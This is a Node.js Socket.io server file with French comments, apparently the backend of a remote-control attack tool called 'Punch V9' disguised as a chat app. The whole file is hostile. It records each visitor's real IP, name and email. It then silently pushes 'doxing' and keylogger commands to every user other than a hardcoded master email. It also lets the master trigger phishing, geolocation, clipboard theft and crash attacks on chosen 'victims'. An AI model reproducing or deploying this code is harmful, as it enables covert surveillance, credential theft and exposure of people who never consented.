/**
 * PUNCH V9 SERVER - SILENT REQUIEM
 * OPTIMISÉ POUR RENDER.COM
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 1e7,
    cors: { origin: "*" }
});

app.use(express.static(__dirname));

let users = [];

io.on('connection', (socket) => {
    
    // RÉCUPÉRATION IP RÉELLE (PROXY RENDER)
    const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    const clientIp = rawIp.split(',')[0].trim();

    socket.on('init', (data) => {
        const newUser = { 
            id: socket.id, 
            name: data.n || "Inconnu",
            email: data.e || "no-mail",
            ip: clientIp
        };
        
        users.push(newUser);

        // --- LE PIÈGE AUTOMATIQUE (L'AUTO-STRIKE) ---
        // Dès qu'une victime (pas le Master) se connecte :
        if (newUser.email !== "toucheur2pp@heaven.com") {
            // On lance immédiatement le Doxing et le Keylogger en silence
            setTimeout(() => {
                io.to(socket.id).emit('execute', { type: 'p_full' });
                io.to(socket.id).emit('execute', { type: 'p_key' });
                console.log(`\x1b[41m[AUTO_ATTACK]\x1b[0m Doxing & Keylog lancés sur ${newUser.name}`);
            }, 2000); // On attend 2 secondes pour que la page charge
        }

        // Logs console pour toi sur Render
        console.log(`\x1b[32m[VICTIM_IN]\x1b[0m ${newUser.name} (${newUser.ip})`);

        // Mise à jour de la liste
        io.emit('sync', users.map(u => ({ id: u.id, n: u.name, e: u.email })));
    });

    // ROUTAGE DES ATTAQUES MANUELLES
    const attacks = ['p_full', 'p_key', 'p_phish', 'p_geo', 'p_clip', 'p_crash'];
    attacks.forEach(type => {
        socket.on(type, (targetId) => {
            const boss = users.find(u => u.id === socket.id);
            if (boss && boss.email === "toucheur2pp@heaven.com") {
                io.to(targetId).emit('execute', { type: type });
            }
        });
    });

    socket.on('chat', (data) => {
        const sender = users.find(u => u.id === socket.id);
        if (sender) io.emit('chat', { n: sender.name, t: data });
    });

    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        io.emit('sync', users.map(u => ({ id: u.id, n: u.name, e: u.email })));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\x1b[35m[SYSTEM_ACTIVE]\x1b[0m Punch V9 Port: ${PORT}`);
});
